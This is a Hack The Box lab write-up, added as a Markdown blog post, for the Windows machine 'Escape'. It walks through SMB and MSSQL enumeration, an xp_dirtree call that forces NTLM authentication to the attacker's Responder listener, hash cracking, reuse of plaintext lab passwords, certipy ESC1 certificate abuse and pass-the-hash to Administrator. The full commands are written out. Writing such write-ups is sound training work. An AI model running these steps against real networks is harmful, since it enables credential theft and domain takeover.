@@ -1,0 +1,395 @@
+---
+title: HTB - Escape (Medium)
+date: '2025-07-24'
+tags: ['machine', 'windows', 'Active Directory', 'MSSQL', 'NTLM-Relay', 'ESC1']
+draft: false
+summary:  Guest Logon enumeration leads to early access to an SQL Server which allows for performing an NTLM Relay attack that captures a crackable hash. Using the valid credentials to find other credentials of another user in a backup log file. Elevating to Domain Admin by enumerating vulnerable certificate templates that reveal the current template is vulnerable to ESC1
+---
+
+![Description](/static/images/htb/windows/escape/Escape.png)
+
+<TOCInline toc={props.toc} asDisclosure />
+
+## Scanning
+
+```
+❯ nmap -sV -sC -v -Pn 10.129.228.253
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-24 00:24 +08
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 00:24
+Completed NSE at 00:24, 0.00s elapsed
+Initiating NSE at 00:24
+Completed NSE at 00:24, 0.00s elapsed
+Initiating NSE at 00:24
+Completed NSE at 00:24, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 00:24
+Completed Parallel DNS resolution of 1 host. at 00:24, 0.01s elapsed
+Initiating Connect Scan at 00:24
+Scanning 10.129.228.253 [1000 ports]
+Discovered open port 135/tcp on 10.129.228.253
+Discovered open port 53/tcp on 10.129.228.253
+Discovered open port 445/tcp on 10.129.228.253
+Discovered open port 139/tcp on 10.129.228.253
+Discovered open port 3268/tcp on 10.129.228.253
+Discovered open port 3269/tcp on 10.129.228.253
+Discovered open port 636/tcp on 10.129.228.253
+Discovered open port 88/tcp on 10.129.228.253
+Discovered open port 593/tcp on 10.129.228.253
+Discovered open port 389/tcp on 10.129.228.253
+Discovered open port 464/tcp on 10.129.228.253
+Discovered open port 1433/tcp on 10.129.228.253
+Completed Connect Scan at 00:24, 4.04s elapsed (1000 total ports)
+Initiating Service scan at 00:24
+Scanning 12 services on 10.129.228.253
+Completed Service scan at 00:25, 49.55s elapsed (12 services on 1 host)
+NSE: Script scanning 10.129.228.253.
+Initiating NSE at 00:25
+Completed NSE at 00:25, 40.12s elapsed
+Initiating NSE at 00:25
+Completed NSE at 00:26, 9.40s elapsed
+Initiating NSE at 00:26
+Completed NSE at 00:26, 0.01s elapsed
+Nmap scan report for 10.129.228.253
+Host is up (0.014s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-24 00:24:30Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-07-24T00:25:56+00:00; +7h59m57s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Issuer: commonName=sequel-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-01-18T23:03:57
+| Not valid after:  2074-01-05T23:03:57
+| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
+|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-07-24T00:25:56+00:00; +7h59m57s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Issuer: commonName=sequel-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-01-18T23:03:57
+| Not valid after:  2074-01-05T23:03:57
+| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
+|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ssl-date: 2025-07-24T00:25:56+00:00; +8h00m00s from scanner time.
+| ms-sql-info: 
+|   10.129.228.253:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ms-sql-ntlm-info: 
+|   10.129.228.253:1433: 
+|     Target_Name: sequel
+|     NetBIOS_Domain_Name: sequel
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: sequel.htb
+|     DNS_Computer_Name: dc.sequel.htb
+|     DNS_Tree_Name: sequel.htb
+|_    Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-07-24T00:20:31
+| Not valid after:  2055-07-24T00:20:31
+| MD5:   f8e0:4e68:92f1:22d9:de68:b7ec:df0b:8982
+|_SHA-1: 56d7:7ac2:eb5a:f6d8:3280:30e6:6f38:d30a:475a:c995
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Issuer: commonName=sequel-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-01-18T23:03:57
+| Not valid after:  2074-01-05T23:03:57
+| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
+|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
+|_ssl-date: 2025-07-24T00:25:56+00:00; +7h59m57s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-07-24T00:25:56+00:00; +7h59m57s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Issuer: commonName=sequel-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-01-18T23:03:57
+| Not valid after:  2074-01-05T23:03:57
+| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
+|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-24T00:25:16
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h59m58s, deviation: 1s, median: 7h59m56s
+
+NSE: Script Post-scanning.
+Initiating NSE at 00:26
+Completed NSE at 00:26, 0.00s elapsed
+Initiating NSE at 00:26
+Completed NSE at 00:26, 0.00s elapsed
+Initiating NSE at 00:26
+Completed NSE at 00:26, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 103.43 seconds
+```
+
+Scanning shows that a CA Certificate is present, quite possibly is what we have to deal with privesc later on. Other than that,
+there seems to be an MSSQL Server present.
+
+---
+
+## Enumeration
+
+```
+❯ nxc smb 10.129.228.253 -u 'a' -p '' --users
+```
+
+![Description](/static/images/htb/windows/escape/1.jpg)
+
+Guest logon is enabled, enumerate shares
+
+```
+❯ smbclient -L 10.129.228.253 -U a%
+```
+
+![Description](/static/images/htb/windows/escape/2.jpg)
+
+Observe there is a non-default share, `Public`. Inside the share, we can find a PDF file titled `SQL Server Procedures.pdf`
+
+![Description](/static/images/htb/windows/escape/3.jpg)
+
+The PDF reveals almost everyone's usernames but at the bottom we have a valid username and password. It also hints that
+the credentials only work for MSSQL authentication
+
+![Description](/static/images/htb/windows/escape/4.jpg)
+
+let us verify them
+
+```
+❯ nxc mssql sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth
+```
+
+![Description](/static/images/htb/windows/escape/5.jpg)
+
+yes, valid now let us try to query available databases
+
+```
+❯ nxc mssql sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+```
+
+![Description](/static/images/htb/windows/escape/6.jpg)
+
+Okay querying works, let us try to get code execution by using `xp_cmdshell` option
+
+```
+❯ nxc mssql sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth -x whoami
+```
+
+![Description](/static/images/htb/windows/escape/7.jpg)
+
+Doesn't work, which means our user does not have System Administrator (sa) rights, but we can try other methods hehe. But
+first, we can brute force the RID on the target to get valid username logons
+
+```
+❯ nxc mssql sequel.htb -u PublicUser -p 'GuestUserCantWrite1' --local-auth --rid-brute
+```
+
+![Description](/static/images/htb/windows/escape/8.jpg)
+
+We can put them in a file called `usernames.txt`. Going forward with our attack, we can try to perform a common attack method
+which is Relaying NTLM to MSSQL or "ntlm-relay attack" just for short
+
+---
+
+## NTLM Relay
+
+https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/
+
+The above link is a fantastic article on trying the attack out and what to look for in the same situation. I will use it as my reference
+
+![Description](/static/images/htb/windows/escape/article.png)
+
+In our current situation, we can perform queries but not code execution, we can try to trigger the `xp_dirtree` command to autheticate to our SMB server
+and listen for upcoming connections to capture the NTLM hash
+
+The article also mentions a custom-tool they made that can be used to perform checks and auto pwn the MSSQL server:
+
+https://github.com/CompassSecurity/mssqlrelay
+
+Unfortunately, it didnt work for me. So I just used good old Responder. First we need to get an SQL shell, we can use impacket's
+`mssqlclient` to do this
+
+```
+❯ impacket-mssqlclient PublicUser@sequel.htb
+```
+
+Then we turn on Responder on another tab
+
+```
+❯ sudo responder -I tun0 -v
+```
+
+Make sure the SMB server options is enabled
+
+![Description](/static/images/htb/windows/escape/9.jpg)
+
+Then we execute the `xp_dirtree` command with this syntax
+
+```sql
+EXEC master.sys.xp_dirtree '\\10.10.14.72\pwned',1, 1
+```
+
+Now, we check our Responder and see that the NTLM hash has been captured for user `sql_svc`
+
+![Description](/static/images/htb/windows/escape/10.jpg)
+
+---
+
+## Cracking
+
+Proceed to crack his hash
+
+```
+❯ hashcat -a 0 -m 5600 sql_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Anddd we have the password
+
+![Description](/static/images/htb/windows/escape/11.jpg)
+
+Also turns out, we can WinRM inside `sql_svc`
+
+![Description](/static/images/htb/windows/escape/12.jpg)
+
+---
+
+## Gaining Access
+
+```
+❯ nxc winrm sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
+```
+
+But there was no user flag
+
+![Description](/static/images/htb/windows/escape/13.jpg)
+
+## Lateral Movement
+
+So I kept looking and looking and found the SQLServer folder
+
+![Description](/static/images/htb/windows/escape/14.jpg)
+
+I kept looking into it and found this backup log file inside
+
+![Description](/static/images/htb/windows/escape/15.jpg)
+
+Checked inside and found credentials for user `ryan.cooper`
+
+![Description](/static/images/htb/windows/escape/16.jpg)
+
+Verify them
+
+```
+❯ nxc winrm sequel.htb -u ryan.cooper -p 'NuclearMosquito3'
+```
+
+![Description](/static/images/htb/windows/escape/17.jpg)
+
+Nice, we can also WinRM inside and get the user flag
+
+```
+❯ evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
+```
+
+![Description](/static/images/htb/windows/escape/18.jpg)
+
+---
+
+## Privilege Escalation
+
+Now, let's try to enumerate for vulnerable CA certificate templates
+
+```
+❯ certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -stdout -vulnerable
+```
+
+![Description](/static/images/htb/windows/escape/20.jpg)
+![Description](/static/images/htb/windows/escape/19.jpg)
+
+Nice, the Template Name, `UserAuthentication` is vulnerable to ESC1. This means we can easily request a certificate for the target user
+which is `Administrator`
+
+```
+❯ certipy req -u ryan.cooper -p NuclearMosquito3 -dc-ip 10.129.228.253 -target dc.sequel.htb -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb
+```
+
+![Description](/static/images/htb/windows/escape/21.jpg)
+
+Now that we have the certificate, we can easily authenticate as `Administrator`
+
+```
+❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.228.253'
+```
+
+![Description](/static/images/htb/windows/escape/22.jpg)
+
+Nice, using the NT Hash we can WinRM inside and get the root flag
+
+```
+❯ evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+
+![Description](/static/images/htb/windows/escape/23.jpg)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
